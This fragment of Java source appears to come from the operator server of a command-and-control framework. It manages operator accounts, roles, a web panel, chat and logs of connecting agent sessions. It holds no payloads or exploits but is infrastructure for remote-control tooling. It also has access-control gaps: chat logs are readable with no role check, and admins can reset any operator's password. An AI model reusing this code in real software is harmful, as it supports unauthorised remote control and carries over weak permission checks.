    private String ApiOpList(HttpExchange Exchange, TokenInfo Token) {
        if (!Token.Role().CanManage()) { SetStatus(403); return HttpHelper.Json(Map.of("Error", "ADMIN role required")); }
        return HttpHelper.Json(Map.of("Operators", Db.GetOperators()));
    }

    private String ApiOpCreate(HttpExchange Exchange, TokenInfo Token) throws Exception {
        if (!Token.Role().CanManage()) { SetStatus(403); return HttpHelper.Json(Map.of("Error", "ADMIN role required")); }
        Map<String, Object> RequestBody = Body(Exchange);
        String Username = Str(RequestBody, "Username", "");
        String Password = Str(RequestBody, "Password", "");
        String Role     = Str(RequestBody, "Role", "OPERATOR");
        if (Username.isEmpty() || Password.isEmpty()) { SetStatus(400); return HttpHelper.Json(Map.of("Error", "Username and Password required")); }
        if (Password.length() < 8) { SetStatus(400); return HttpHelper.Json(Map.of("Error", "Password must be at least 8 characters")); }
        OperatorRole NewRole = OperatorRole.FromString(Role);
        if (NewRole == OperatorRole.SUPER && !Token.Role().IsSuperAdmin()) { SetStatus(403); return HttpHelper.Json(Map.of("Error", "Only SUPER can create SUPER")); }
        if (!Db.CreateOperator(Username, Password, NewRole)) { SetStatus(409); return HttpHelper.Json(Map.of("Error", "Username already exists")); }
        AddLog("[TEAM] Created operator: " + Username + " [" + NewRole + "] by " + Token.Username());
        return HttpHelper.Json(Map.of("Success", true, "Username", Username, "Role", NewRole.name()));
    }

    private String ApiOpDelete(HttpExchange Exchange, TokenInfo Token) throws Exception {
        if (!Token.Role().CanManage()) { SetStatus(403); return HttpHelper.Json(Map.of("Error", "ADMIN role required")); }
        String Username = Str(Body(Exchange), "Username", "");
        if (Username.isEmpty()) { SetStatus(400); return HttpHelper.Json(Map.of("Error", "Username required")); }
        if (Username.equalsIgnoreCase(Config.GetAdminUsername())) { SetStatus(403); return HttpHelper.Json(Map.of("Error", "Cannot delete admin")); }
        if (!Db.DeleteOperator(Username)) { SetStatus(404); return HttpHelper.Json(Map.of("Error", "Operator not found")); }
        Tokens.entrySet().removeIf(Entry -> Entry.getValue().Username().equals(Username));
        AddLog("[TEAM] Deleted operator: " + Username + " by " + Token.Username());
        return HttpHelper.Json(Map.of("Success", true));
    }

    private String ApiOpRole(HttpExchange Exchange, TokenInfo Token) throws Exception {
        if (!Token.Role().CanManage()) { SetStatus(403); return HttpHelper.Json(Map.of("Error", "ADMIN role required")); }
        Map<String, Object> RequestBody = Body(Exchange);
        String Username = Str(RequestBody, "Username", "");
        String Role     = Str(RequestBody, "Role", "");
        if (Username.isEmpty() || Role.isEmpty()) { SetStatus(400); return HttpHelper.Json(Map.of("Error", "Username and Role required")); }
        if (Username.equalsIgnoreCase(Config.GetAdminUsername())) { SetStatus(403); return HttpHelper.Json(Map.of("Error", "Cannot change admin role")); }
        OperatorRole NewRole = OperatorRole.FromString(Role);
        if (!Db.UpdateOperatorRole(Username, NewRole)) { SetStatus(404); return HttpHelper.Json(Map.of("Error", "Operator not found")); }
        AddLog("[TEAM] Role updated: " + Username + " → " + NewRole + " by " + Token.Username());
        return HttpHelper.Json(Map.of("Success", true));
    }

    private String ApiOpPassword(HttpExchange Exchange, TokenInfo Token) throws Exception {
        if (!Token.Role().CanManage()) { SetStatus(403); return HttpHelper.Json(Map.of("Error", "ADMIN role required")); }
        Map<String, Object> RequestBody = Body(Exchange);
        String Username = Str(RequestBody, "Username", "");
        String Password = Str(RequestBody, "Password", "");
        if (Username.isEmpty() || Password.isEmpty()) { SetStatus(400); return HttpHelper.Json(Map.of("Error", "Username and Password required")); }
        if (Password.length() < 8) { SetStatus(400); return HttpHelper.Json(Map.of("Error", "Password must be at least 8 characters")); }
        if (!Db.UpdateOperatorPassword(Username, Password)) { SetStatus(404); return HttpHelper.Json(Map.of("Error", "Operator not found")); }
        AddLog("[TEAM] Password changed: " + Username + " by " + Token.Username());
        return HttpHelper.Json(Map.of("Success", true));
    }

    private String ApiOpKick(HttpExchange Exchange, TokenInfo Token) throws Exception {
        if (!Token.Role().CanKickOperator()) { SetStatus(403); return HttpHelper.Json(Map.of("Error", "SUPER role required")); }
        String Username = Str(Body(Exchange), "Username", "");
        if (Username.isEmpty()) { SetStatus(400); return HttpHelper.Json(Map.of("Error", "Username required")); }
        if (Username.equalsIgnoreCase(Config.GetAdminUsername())) { SetStatus(403); return HttpHelper.Json(Map.of("Error", "Cannot kick admin")); }
        if (Username.equals(Token.Username())) { SetStatus(400); return HttpHelper.Json(Map.of("Error", "Cannot kick yourself")); }
        int RevokedCount = (int) Tokens.entrySet().stream()
            .filter(Entry -> Entry.getValue().Username().equals(Username))
            .peek(Entry -> Tokens.remove(Entry.getKey()))
            .count();
        AddLog("[TEAM] Kicked (tokens revoked=" + RevokedCount + "): " + Username + " by " + Token.Username());
        return HttpHelper.Json(Map.of("Success", true, "TokensRevoked", RevokedCount));
    }

    private String ApiRoles(HttpExchange Exchange, TokenInfo Token) {
        List<Map<String, Object>> Roles = new ArrayList<>();
        for (OperatorRole Role : OperatorRole.values()) {
            Map<String, Object> Entry = new LinkedHashMap<>();
            Entry.put("Name",        Role.name());
            Entry.put("Permissions", Role.PermissionString());
            Entry.put("CanExec",     Role.CanExecute());
            Entry.put("CanWrite",    Role.CanWrite());
            Entry.put("CanRead",     Role.CanRead());
            Entry.put("CanKill",     Role.CanKillSession());
            Entry.put("CanManage",   Role.CanManage());
            Entry.put("CanKick",     Role.CanKickOperator());
            Entry.put("IsSuper",     Role.IsSuperAdmin());
            Roles.add(Entry);
        }
        return HttpHelper.Json(Map.of("Roles", Roles));
    }

    private String ApiWebPanelStart(HttpExchange Exchange, TokenInfo Token) throws Exception {
        if (!Token.Role().CanWrite()) { SetStatus(403); return HttpHelper.Json(Map.of("Error", "insufficient permissions")); }
        if (WebPanelHttpServer != null) { SetStatus(409); return HttpHelper.Json(Map.of("Error", "web panel already running on port " + WebPanelPort)); }
        Map<String, Object> RequestBody = Body(Exchange);
        String RequestedHost = Str(RequestBody, "Host", "0.0.0.0");
        int    RequestedPort = Num(RequestBody, "Port", 8080);
        try {
            HttpServer Panel = HttpServer.create(new InetSocketAddress(RequestedHost, RequestedPort), 64);
            HttpRouter PanelRouter = new HttpRouter(Panel, Config, PathResolver);
            RegisterRoutesOn(PanelRouter);
            PanelRouter.RegisterStatic();
            Panel.setExecutor(Executors.newFixedThreadPool(8, Task -> {
                Thread Worker = new Thread(Task);
                Worker.setDaemon(true);
                return Worker;
            }));
            Panel.start();
            WebPanelHttpServer = Panel;
            WebPanelHost       = RequestedHost;
            WebPanelPort       = RequestedPort;
            String DisplayHost = RequestedHost.equals("0.0.0.0") ? "localhost" : RequestedHost;
            String Url = "http://" + DisplayHost + ":" + RequestedPort + "/";
            Logger.Info("Web panel enabled on " + Url + " by " + Token.Username());
            AddLog("Web panel started on " + Url + " by " + Token.Username());
            return HttpHelper.Json(Map.of("Success", true, "URL", Url));
        } catch (Exception Exception) {
            SetStatus(500);
            return HttpHelper.Json(Map.of("Error", "web panel start failed: " + Exception.getMessage()));
        }
    }

    private String ApiWebPanelStop(HttpExchange Exchange, TokenInfo Token) throws Exception {
        if (!Token.Role().CanWrite()) { SetStatus(403); return HttpHelper.Json(Map.of("Error", "insufficient permissions")); }
        if (WebPanelHttpServer == null) { SetStatus(409); return HttpHelper.Json(Map.of("Error", "web panel not running")); }
        HttpServer ToStop  = WebPanelHttpServer;
        WebPanelHttpServer = null;
        WebPanelHost       = null;
        WebPanelPort       = -1;
        Logger.Info("Web panel stopped by " + Token.Username());
        AddLog("Web panel stopped by " + Token.Username());
        Thread Stopper = new Thread(() -> {
            try { Thread.sleep(300); } catch (InterruptedException Ignored) {}
            ToStop.stop(0);
        }, "WebPanelStopper");
        Stopper.setDaemon(true);
        Stopper.start();
        return HttpHelper.Json(Map.of("Success", true));
    }

    private String ApiWebPanelStatus(HttpExchange Exchange, TokenInfo Token) {
        boolean Running = WebPanelHttpServer != null;
        Map<String, Object> Response = new LinkedHashMap<>();
        Response.put("Running", Running);
        if (Running) {
            String DisplayHost = WebPanelHost != null && WebPanelHost.equals("0.0.0.0") ? "localhost" : WebPanelHost;
            Response.put("URL",  "http://" + DisplayHost + ":" + WebPanelPort + "/");
            Response.put("Host", WebPanelHost);
            Response.put("Port", WebPanelPort);
        }
        return HttpHelper.Json(Response);
    }

    private String ApiTasks(HttpExchange Exchange, TokenInfo Token) {
        return HttpHelper.Json(Map.of("Tasks", List.of()));
    }

    private String ApiChatSend(HttpExchange Exchange, TokenInfo Token) throws Exception {
        Map<String, Object> RequestBody = Body(Exchange);
        String Message = Str(RequestBody, "Message", "");
        String To      = Str(RequestBody, "To", "all");
        if (Message.isEmpty()) { SetStatus(400); return HttpHelper.Json(Map.of("Error", "Message required")); }
        Db.SaveChatLog(Token.Username(), To, Message);
        return HttpHelper.Json(Map.of("Success", true));
    }

    private String ApiChatMessages(HttpExchange Exchange, TokenInfo Token) throws Exception {
        String Username = Token.Username();
        List<Map<String, Object>> AllMessages = Db.GetChatLogs(500);
        List<Map<String, Object>> Visible = new ArrayList<>();
        for (Map<String, Object> Message : AllMessages) {
            String To   = Message.getOrDefault("To", "all").toString();
            String From = Message.getOrDefault("From", "").toString();
            boolean IsForUser = To.equals("all") || From.equals(Username);
            if (!IsForUser) {
                for (String Recipient : To.split(",")) {
                    if (Recipient.trim().equalsIgnoreCase(Username)) { IsForUser = true; break; }
                }
            }
            if (IsForUser) Visible.add(Message);
        }
        return HttpHelper.Json(Map.of("Messages", Visible, "Count", Visible.size()));
    }

    private String ApiChatLogs(HttpExchange Exchange, TokenInfo Token) throws Exception {
        int Limit = Num(Body(Exchange), "Limit", 100);
        return HttpHelper.Json(Map.of("Logs", Db.GetChatLogs(Math.min(Limit, 1000))));
    }

    private void OnEvent(EventType Type, Map<String, Object> Data) {
        switch (Type) {
            case ServerStarted -> AddLog("Listener started on " + Data.get("Host") + ":" + Data.get("Port") + " [" + Data.get("Mode") + "]");
            case AgentConnected -> {
                AddLog("[+] session-" + Data.get("ID") + " [" + Data.get("Type") + "] " + Data.get("User") + "@" + Data.get("Hostname") + " " + Data.get("OS") + " key=" + Data.get("SessionKey"));
                Db.SaveSessionEvent(Data, "connected");
            }
            case AgentDisconnected -> {
                AddLog("[-] session-" + Data.get("ID") + " disconnected: " + Data.get("Reason"));
                Db.SaveSessionEvent(Data, "disconnected");
            }
            case AgentRemoved -> AddLog("[-] session-" + Data.get("ID") + " removed");
            case Error         -> AddLog("[!] " + Data.get("Message"));
        }
    }
}
